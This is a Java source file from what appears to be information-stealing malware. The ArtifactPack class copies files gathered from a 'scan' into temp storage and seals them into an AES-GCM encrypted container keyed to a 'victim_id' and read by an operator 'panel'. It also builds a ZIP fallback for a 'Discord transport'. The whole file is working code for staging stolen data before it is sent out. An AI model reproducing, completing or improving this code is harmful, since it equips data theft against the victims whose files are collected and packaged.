package com.spcagentpayloa.jvmxx.crypto;

import com.spcagentpayloa.jvmxx.Json;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.Deflater;

/**
 * Deterministic artifact container v1: plaintext manifest, Deflate + AES-GCM
 * blobs. AAD binds every blob to the manifest hash and artifact id, so a flipped
 * byte fails before it reaches the panel. The key is derived from the build
 * secret, build_id and victim_id only.
 *
 * <p>Every added file is copied once to a private temp directory and only its
 * path, size and SHA-256 stay in memory. Building the container and the ZIP
 * fallback both stream from disk, so a multi-hundred-megabyte scan no longer
 * needs one byte[] per file.</p>
 */
final class ArtifactPack implements AutoCloseable {
	private static final int MAX_ENTRIES = 20_000;
	record Item(String path, String kind, Path temp, long size, String sha256) {
	}

	private final CryptoConfig config;
	private final String victimId;
	private final String module;
	private final Path tempDir;
	private final List<Item> items = new ArrayList<>();
	private long total;
	private long budget;

	ArtifactPack(CryptoConfig config, String victimId, String module) {
		this(config, victimId, module, null);
	}

	/**
	 * The cache drive is configurable: it may live on a different filesystem
	 * than java.io.tmpdir, and the contract wants staging under control.
	 */
	ArtifactPack(CryptoConfig config, String victimId, String module, java.nio.file.Path cacheRoot) {
		this.config = config;
		this.victimId = victimId;
		this.module = module;
		this.budget = config.maxArtifact;
		try {
			java.nio.file.Path root = cacheRoot == null
				? java.nio.file.Path.of(System.getProperty("java.io.tmpdir", "."))
				: cacheRoot;
			Files.createDirectories(root);
			com.spcagentpayloa.jvmxx.Disk.require(root, com.spcagentpayloa.jvmxx.Disk.MIN_FREE);
			this.tempDir = Files.createTempDirectory(root, "spc-pack-");
		} catch (IllegalStateException state) {
			throw state;
		} catch (Throwable throwable) {
			throw new IllegalStateException("pack temp dir failed", throwable);
		}
	}

	/** Per-scan byte budget, still capped by the profile limit. */
	synchronized void budget(long bytes) {
		if (bytes > 0L) {
			budget = Math.min(config.maxArtifact, bytes);
		}
	}

	synchronized long budget() {
		return budget;
	}

	Path tempDir() {
		return tempDir;
	}

	synchronized boolean add(Path file, String path, String kind) {
		try {
			if (file == null || !Files.isRegularFile(file)) {
				return false;
			}
			if (items.size() >= MAX_ENTRIES) {
				return false;
			}
			long size = Files.size(file);
			if (size <= 0L || total + size > budget) {
				return false;
			}
			if (com.spcagentpayloa.jvmxx.Disk.low(com.spcagentpayloa.jvmxx.Disk.free(tempDir), 16L * 1024L * 1024L)) {
				return false;
			}
			Path temp = tempDir.resolve("item-" + (items.size() + 1) + ".bin");
			String sha = copyAndHash(file, temp);
			if (sha == null) {
				Files.deleteIfExists(temp);
				return false;
			}
			items.add(new Item(sanitize(path), kind, temp, size, sha));
			total += size;
			return true;
		} catch (Throwable throwable) {
			return false;
		}
	}

	synchronized boolean add(byte[] data, String path, String kind) {
		if (data == null || data.length == 0 || total + data.length > budget || items.size() >= MAX_ENTRIES) {
			return false;
		}
		try {
			Path temp = tempDir.resolve("item-" + (items.size() + 1) + ".bin");
			Files.write(temp, data);
			items.add(new Item(sanitize(path), kind, temp, data.length, sha256(data)));
			total += data.length;
			return true;
		} catch (Throwable throwable) {
			return false;
		}
	}

	synchronized int size() {
		return items.size();
	}

	synchronized long bytes() {
		return total;
	}

	synchronized Path build(Path target) throws Exception {
		if (items.isEmpty()) {
			throw new IllegalStateException("empty container");
		}
		byte[] prefix = CryptoUtil.random(8);
		int epoch = config.epoch();
		byte[] key = config.artifactKey(prefix, victimId, epoch);
		List<Map<String, Object>> index = new ArrayList<>();
		for (int i = 0; i < items.size(); i++) {
			Item item = items.get(i);
			Map<String, Object> row = new LinkedHashMap<>();
			row.put("id", "a" + (i + 1));
			row.put("path", item.path());
			row.put("kind", item.kind());
			row.put("size", item.size());
			row.put("sha256", item.sha256());
			row.put("mode", 384);
			index.add(row);
		}
		Map<String, Object> manifest = new LinkedHashMap<>();
		manifest.put("container_version", 1);
		manifest.put("build_id", config.buildId);
		manifest.put("victim_id", victimId);
		manifest.put("os", CryptoPaths.os());
		manifest.put("profile", config.full ? "full" : "lite");
		manifest.put("module", module);
		manifest.put("created_at", System.currentTimeMillis() / 1000L);
		manifest.put("nonce_prefix", CryptoUtil.b64url(prefix));
		manifest.put("key_scheme", config.scheme());
		manifest.put("key_epoch", epoch);
		manifest.put("key_probe", CryptoUtil.b64url(CryptoUtil.hmac(key, CryptoUtil.utf8("probe"))));
		manifest.put("total_size", total);
		manifest.put("artifacts", index);
		byte[] manifestBytes = CryptoUtil.utf8(Json.stringify(manifest));
		String manifestHash = CryptoUtil.hex(CryptoUtil.sha256(manifestBytes));


		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
		Files.createDirectories(target.getParent());
		try {
		try (java.io.RandomAccessFile out = new java.io.RandomAccessFile(temp.toFile(), "rw")) {
			out.setLength(0L);
			out.write(manifestBytes);
			out.write('\n');
			out.write(CryptoUtil.utf8(manifestHash));
			out.write('\n');
			for (int i = 0; i < items.size(); i++) {
				Item item = items.get(i);
				String id = "a" + (i + 1);
				com.spcagentpayloa.jvmxx.Log.debug("pack item " + (i + 1) + "/" + items.size() + " size=" + item.size());
				byte[] nonce = new byte[12];
				System.arraycopy(prefix, 0, nonce, 0, 8);
				nonce[8] = (byte) (i >>> 24);
				nonce[9] = (byte) (i >>> 16);
				nonce[10] = (byte) (i >>> 8);
				nonce[11] = (byte) i;
				out.write(CryptoUtil.utf8("BLOB " + id + " "));
				long sizePosition = out.getFilePointer();
				// Twelve digits, patched after the stream finishes. Number() in
				// the panel parser accepts the leading zeros.
				out.write(CryptoUtil.utf8("000000000000\n"));
				CountingOutputStream counter = new CountingOutputStream(
					java.nio.channels.Channels.newOutputStream(out.getChannel()));
				try (InputStream input = Files.newInputStream(item.temp())) {
					sealInto(input, counter, key, nonce, CryptoUtil.utf8(manifestHash + ":" + id));
				}
				if (counter.count <= 0L) {
					throw new IllegalStateException("empty blob " + id);
				}
				// Channel writes do not move RandomAccessFile's pointer. Use the
				// real file end, not the position captured before sealing, or the
				// next header overwrites this blob.
				long blobEnd = out.length();
				out.seek(sizePosition);
				out.write(CryptoUtil.utf8(String.format(java.util.Locale.ROOT, "%012d", counter.count)));
				out.seek(blobEnd);
				com.spcagentpayloa.jvmxx.Log.debug("pack wrote " + id + " count=" + counter.count + " file=" + blobEnd + " at=" + out.getFilePointer());
			}
		}
		} catch (Throwable throwable) {
			Files.deleteIfExists(temp);
			throw throwable;
		}
		try {
			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		} catch (Throwable throwable) {
			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING);
		}
		return target;
	}

	/** Plain ZIP fallback for the Discord transport (no container framing). */
	synchronized Path buildZip(Path target) throws Exception {
		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
		try (java.util.zip.ZipOutputStream zip = new java.util.zip.ZipOutputStream(
			Files.newOutputStream(temp))) {
			zip.setLevel(6);
			java.util.Set<String> seen = new java.util.HashSet<>();
			byte[] buffer = new byte[65536];
			for (Item item : items) {
				if (!seen.add(item.path())) {
					continue;
				}
				zip.putNextEntry(new java.util.zip.ZipEntry(item.path()));
				try (InputStream input = Files.newInputStream(item.temp())) {
					int count;
					while ((count = input.read(buffer)) > 0) {
						zip.write(buffer, 0, count);
					}
				}
				zip.closeEntry();
			}
		}
		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING);
		return target;
	}

	@Override
	public synchronized void close() {
		try (var stream = Files.walk(tempDir)) {
			for (Path path : stream.sorted(java.util.Comparator.reverseOrder()).toList()) {
				Files.deleteIfExists(path);
			}
		} catch (Throwable ignored) {
			// best effort
		}
	}

	private static String copyAndHash(Path source, Path target) {
		try {
			MessageDigest digest = MessageDigest.getInstance("SHA-256");
			try (InputStream input = Files.newInputStream(source);
				OutputStream out = Files.newOutputStream(target, StandardOpenOption.CREATE,
					StandardOpenOption.TRUNCATE_EXISTING)) {
				byte[] buffer = new byte[65536];
				int count;
				while ((count = input.read(buffer)) > 0) {
					digest.update(buffer, 0, count);
					out.write(buffer, 0, count);
				}
			}
			return CryptoUtil.hex(digest.digest());
		} catch (Throwable throwable) {
			return null;
		}
	}

	private static void sealInto(InputStream input, OutputStream out, byte[] key, byte[] nonce, byte[] aad)
			throws Exception {
		Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
		cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, nonce));
		cipher.updateAAD(aad);
		Deflater deflater = new Deflater(6, true);
		byte[] plain = new byte[65536];
		try {
			byte[] buffer = new byte[65536];
			int count;
			while ((count = input.read(buffer)) > 0) {
				deflater.setInput(buffer, 0, count);
				drain(deflater, cipher, out, plain, false);
			}
			deflater.finish();
			drain(deflater, cipher, out, plain, true);
			byte[] tail = cipher.doFinal();
			if (tail != null && tail.length > 0) {
				out.write(tail);
			}
		} finally {
			input.close();
			deflater.end();
		}
	}

	private static void drain(Deflater deflater, Cipher cipher, OutputStream out, byte[] plain, boolean untilFinished)
			throws Exception {
		while (untilFinished ? !deflater.finished() : !deflater.needsInput()) {
			int read = deflater.deflate(plain);
			if (read <= 0) {
				return;
			}
			byte[] sealed = cipher.update(plain, 0, read);
			if (sealed != null && sealed.length > 0) {
				out.write(sealed);
			}
		}
	}

	private static final class CountingOutputStream extends OutputStream {
		private final OutputStream delegate;
		private long count;

		private CountingOutputStream(OutputStream delegate) {
			this.delegate = delegate;
		}

		@Override
		public void write(int value) throws java.io.IOException {
			delegate.write(value);
			count++;
		}

		@Override
		public void write(byte[] data, int offset, int length) throws java.io.IOException {
			delegate.write(data, offset, length);
			count += length;
		}

		@Override
		public void flush() throws java.io.IOException {
			delegate.flush();
		}
	}

	static String sanitize(String path) {
		String value = path.replace('\\', '/');
		int drive = value.indexOf(':');
		if (drive == 1) {
			value = value.substring(2);
		}
		StringBuilder clean = new StringBuilder();
		for (String part : value.split("/+")) {
			if (part.isEmpty() || part.equals(".")) {
				continue;
			}
			if (part.equals("..")) {
				continue;
			}
			if (clean.length() > 0) {
				clean.append('/');
			}
			clean.append(part);
		}
		value = clean.toString();
		if (value.isEmpty()) {
			value = "unnamed";
		}
		return value.length() > 900 ? value.substring(value.length() - 900) : value;
	}

	static String sha256(Path file) throws Exception {
		MessageDigest digest = MessageDigest.getInstance("SHA-256");
		try (var input = Files.newInputStream(file)) {
			byte[] buffer = new byte[65536];
			int count;
			while ((count = input.read(buffer)) > 0) {
				digest.update(buffer, 0, count);
			}
		}
		return CryptoUtil.hex(digest.digest());
	}

	static String sha256(byte[] data) {
		return CryptoUtil.hex(CryptoUtil.sha256(data));
	}

	static String base64(byte[] data) {
		return Base64.getEncoder().encodeToString(data);
	}
}
